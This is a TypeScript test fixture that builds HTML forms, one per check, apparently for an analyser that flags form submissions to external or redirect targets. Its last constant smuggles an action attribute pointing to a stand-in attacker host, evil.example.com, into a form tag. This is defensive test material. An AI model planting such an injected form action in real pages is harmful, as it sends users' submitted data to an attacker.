// Fixture (FAIL matrix): one form per declared check.
const CHECKOUT = 'https://checkout.stripe.com';
export function pages(): string {
  return `
<form action="/f/abs-literal" method="post"></form>
<form action="/f/location" method="post"></form>
<form action="/f/setheader" method="post"></form>
<form action="/f/writehead" method="post"></form>
<form action="/f/set-object" method="post"></form>
<form action="/f/wrapped" method="post"></form>
<form action="/f/rettype" method="post"></form>
<form action="/f/concise" method="post"></form>
<form action="/f/two-hop" method="post"></form>
<form action="/f/next" method="post"></form>
<form action="/f/mw" method="post"></form>
<form action="/f/regex" method="post"></form>
<form action="/F/Case" method="post"></form>
<form action="https://checkout.stripe.com/pay" method="post"></form>
<form action="${CHECKOUT}/const" method="post"></form>
<form action="/f/ok" method="post"><button formaction="/f/btn">Go</button></form>
<form action="/f/mw-local" method="post"></form>
<form action="/f/use-prefix" method="post"></form>
<form action="/f/shadow" method="post"></form>
<form action="/f/param-shadow" method="post"></form>
<form action="/f/hop-apex" method="post"></form>
<form action="/f/helper" method="post"></form>
<form action="/f/route-chain" method="post"></form>
<form action="/f/slash-hole" method="post"></form>
<form action="/f/append" method="post"></form>
<form action="/f/writehead-var" method="post"></form>
<form action="/f/alias" method="post"></form>
<form action="/f/bind" method="post"></form>
<form action="/f/elem" method="post"></form>
<form action="/f/call" method="post"></form>
<form action="/f/star-hop" method="post"></form>
<form action="/f/legacy-order" method="post"></form>
<form action="/f/methods" method="post"></form>
<form data-action="/f/ok" onsubmit="return this.x.value.length>3" action=/f/unquoted method=post></form>`;
}
export function holePage(suffix: string): string {
  return `<form method="post" action="/f/hole${suffix}"></form>`;
}
// A const that injects action= right after a quoted value: expanded and SEEN, not guessed at.
const ACT = ' action="https://evil.example.com/x" method="post"';
export const attrActionPage = `<form id="f-attr"${ACT}></form>`;
